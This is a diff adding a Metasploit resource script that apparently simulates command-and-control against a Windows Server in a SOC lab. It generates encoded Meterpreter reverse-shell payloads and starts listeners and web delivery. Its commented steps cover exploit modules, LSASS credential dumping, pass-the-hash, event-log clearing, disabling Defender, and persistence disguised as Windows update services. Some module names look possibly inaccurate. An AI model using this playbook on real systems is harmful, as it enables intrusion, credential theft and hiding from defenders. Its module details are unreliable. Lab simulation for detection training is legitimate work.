@@ -1,0 +1,224 @@
+# Metasploit Resource Script for C2 Simulation
+# Usage: msfconsole -r metasploit_c2.rc
+# Target: Windows Server 2022 (x86_64) in Hybrid Cloud SOC Lab
+
+# ============================================================
+# GLOBAL SETTINGS
+# ============================================================
+setg RHOSTS 10.0.1.10          # Target Windows IP (adjust to your environment)
+setg LHOST 10.0.2.5            # Attacker VM IP (VM2 or dedicated attacker)
+setg LPORT 4444                # Default reverse shell port
+setg SRVPORT 8080              # HTTP server port for payload delivery
+setg URIPATH /                 # URI path for payload
+setg ExitOnSession false       # Keep listener running after session
+setg EnableStageEncoding true  # Encode stage to evade basic detection
+setg StageEncoder x64/xor      # Encoder for x64 payloads
+
+# ============================================================
+# PAYLOAD GENERATION - Windows x64 Meterpreter Reverse TCP
+# ============================================================
+# Generate staged payload (smaller initial stager)
+use payload/windows/x64/meterpreter/reverse_tcp
+set EXITFUNC thread
+set PrependMigrate true
+set PrependMigrateProcess explorer.exe
+generate -f exe -o /tmp/meterpreter_reverse_tcp.exe
+
+# Generate staged payload with RC4 encryption
+use payload/windows/x64/meterpreter_reverse_tcp_rc4
+set RC4PASSWORD labpassword123
+generate -f exe -o /tmp/meterpreter_reverse_tcp_rc4.exe
+
+# Generate stageless payload (larger but no stage download)
+use payload/windows/x64/meterpreter_reverse_tcp
+set Stageless true
+generate -f exe -o /tmp/meterpreter_stageless.exe
+
+# ============================================================
+# PAYLOAD GENERATION - Windows x64 Meterpreter Reverse HTTP/S
+# ============================================================
+use payload/windows/x64/meterpreter/reverse_http
+set LURI /admin/get.php
+set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+generate -f exe -o /tmp/meterpreter_reverse_http.exe
+
+use payload/windows/x64/meterpreter/reverse_https
+set LURI /admin/get.php
+set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+generate -f exe -o /tmp/meterpreter_reverse_https.exe
+
+# ============================================================
+# PAYLOAD DELIVERY - HTTP Server (for staged payloads)
+# ============================================================
+# Host the stage on HTTP server
+use exploit/multi/script/web_delivery
+set target 2  # PowerShell
+set payload windows/x64/meterpreter/reverse_tcp
+set SRVHOST 0.0.0.0
+set SRVPORT 8080
+set URIPATH /payload
+run -j
+
+# ============================================================
+# LISTENERS - Multi-Handler for Reverse Connections
+# ============================================================
+
+# Listener 1: Reverse TCP (Port 4444)
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+run -j
+
+# Listener 2: Reverse TCP RC4 (Port 4445)
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp_rc4
+set LHOST 0.0.0.0
+set LPORT 4445
+set RC4PASSWORD labpassword123
+set ExitOnSession false
+run -j
+
+# Listener 3: Reverse HTTP (Port 8080)
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_http
+set LHOST 0.0.0.0
+set LPORT 8080
+set LURI /admin/get.php
+set ExitOnSession false
+run -j
+
+# Listener 4: Reverse HTTPS (Port 8443)
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 8443
+set LURI /admin/get.php
+set ExitOnSession false
+run -j
+
+# ============================================================
+# EXPLOITATION MODULES (for initial access)
+# ============================================================
+
+# EternalBlue (MS17-010) - SMBv1 Exploit
+# use exploit/windows/smb/ms17_010_eternalblue
+# set payload windows/x64/meterpreter/reverse_tcp
+# run
+
+# BlueKeep (CVE-2019-0708) - RDP Exploit
+# use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+# set payload windows/x64/meterpreter/reverse_tcp
+# run
+
+# PrintNightmare (CVE-2021-34527) - Print Spooler
+# use exploit/windows/smb/printnightmare
+# set payload windows/x64/meterpreter/reverse_tcp
+# run
+
+# ============================================================
+# POST-EXPLOITATION - CREDENTIAL ACCESS (T1003.001)
+# ============================================================
+
+# Once session established, run these post modules:
+
+# 1. Dump LSASS via built-in Mimikatz (Kiwi)
+# meterpreter > load kiwi
+# meterpreter > creds_all
+
+# 2. Hashdump (SAM/NTDS)
+# meterpreter > hashdump
+
+# 3. LSASS Memory Dump via procdump (if available)
+# meterpreter > execute -f c:\windows\temp\procdump.exe -a "-accepteula -ma lsass.exe c:\windows\temp\lsass.dmp"
+
+# 4. WMI Persistence
+# meterpreter > run post/windows/manage/wmi_persistence EXECUTABLE_PATH="C:\Windows\Temp\payload.exe"
+
+# 5. Scheduled Task Persistence
+# meterpreter > run post/windows/manage/persistence_exe REXEPATH="C:\Windows\Temp\payload.exe"
+
+# 6. Registry Run Key Persistence
+# meterpreter > run post/windows/manage/persistence_registry REGISTRY_KEY="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" REGISTRY_VALUE="WindowsUpdate" EXECUTABLE_PATH="C:\Windows\Temp\payload.exe"
+
+# ============================================================
+# POST-EXPLOITATION - LATERAL MOVEMENT
+# ============================================================
+
+# Pass the Hash
+# meterpreter > run post/windows/gather/hashdump
+# use exploit/windows/smb/psexec
+# set SMBUser administrator
+# set SMBPass <NTLM_HASH>
+# set payload windows/x64/meterpreter/reverse_tcp
+# run
+
+# PsExec with Service Creation
+# meterpreter > run post/windows/manage/psexec_command COMMAND="cmd.exe /c whoami"
+
+# WMI Lateral Movement
+# meterpreter > run post/windows/gather/wmi_persistence
+
+# ============================================================
+# POST-EXPLOITATION - DEFENSE EVASION
+# ============================================================
+
+# Clear Event Logs
+# meterpreter > clearev
+
+# Timestomp
+# meterpreter > timestomp "C:\Windows\Temp\payload.exe" -v "C:\Windows\System32\kernel32.dll"
+
+# Disable Windows Defender
+# meterpreter > run post/windows/manage/disable_defender
+
+# Unhook/ETW Bypass
+# meterpreter > run post/windows/manage/unhook
+
+# ============================================================
+# NETWORK RECONNAISSANCE
+# ============================================================
+
+# ARP Scan
+# meterpreter > run post/windows/gather/arp_scanner RHOSTS=10.0.1.0/24
+
+# Port Scan
+# meterpreter > run post/windows/gather/portscan RHOSTS=10.0.1.0/24 PORTS=445,3389,135,139,5985,5986
+
+# Network Share Enumeration
+# meterpreter > run post/windows/gather/enum_shares
+
+# Domain Enumeration (if domain joined)
+# meterpreter > run post/windows/gather/enum_domain
+# meterpreter > run post/windows/gather/enum_domain_users
+# meterpreter > run post/windows/gather/enum_domain_groups
+
+# ============================================================
+# PERSISTENCE - MULTIPLE TECHNIQUES
+# ============================================================
+
+# 1. Registry Run Key
+# meterpreter > run post/windows/manage/persistence_registry REGISTRY_KEY="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" REGISTRY_VALUE="WindowsDefenderUpdate" EXECUTABLE_PATH="C:\Windows\Temp\update.exe"
+
+# 2. Scheduled Task (At startup)
+# meterpreter > run post/windows/manage/persistence_sched_task TASK_NAME="WindowsUpdate" EXECUTABLE_PATH="C:\Windows\Temp\update.exe" TRIGGER=STARTUP
+
+# 3. WMI Event Subscription
+# meterpreter > run post/windows/manage/wmi_persistence EXECUTABLE_PATH="C:\Windows\Temp\update.exe"
+
+# 4. Service Installation
+# meterpreter > run post/windows/manage/persistence_service SERVICE_NAME="WindowsDefenderUpdater" EXECUTABLE_PATH="C:\Windows\Temp\update.exe"
+
+# 5. DLL Search Order Hijacking
+# meterpreter > run post/windows/manage/dll_hijack DLL_NAME="version.dll" EXECUTABLE_PATH="C:\Windows\Temp\malicious.dll"
+
+# ============================================================
+# CLEANUP
+# ============================================================
+
+# Kill all jobs
+# jobs -K
+
+# Exit
+# exit -y
